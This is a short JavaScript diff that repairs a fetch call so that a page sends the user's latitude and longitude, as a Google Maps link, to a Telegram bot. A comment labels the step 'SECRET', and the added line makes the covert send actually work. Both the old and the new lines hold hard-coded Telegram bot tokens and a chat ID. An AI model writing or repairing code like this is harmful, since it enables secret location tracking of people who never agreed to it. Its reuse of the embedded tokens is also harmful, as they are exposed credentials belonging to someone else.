@@ -10,8 +10,7 @@
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
 
                 // SECRET: Send to Telegram (FIXED URL)
-                fetch(`https://api.telegram.org/7929357317:AAHWo_8NLGr5k4d4yAeJr1x-QZo9Ti3KBLY
-/sendMessage?chat_id=2091200246&text=📍 FAMILY ALERT! ${mapsLink}`)
+                fetch(`https://api.telegram.org/bot8415841218:AAFOkRsPB3CAY5X63uKW4P9Z2zOCblpdYHE/sendMessage?chat_id=2091200246&text=TEST&text=📍 FAMILY ALERT! ${mapsLink}`)
                     .then(response => console.log("Message sent!"))
                     .catch(error => console.error("Error:", error));
 
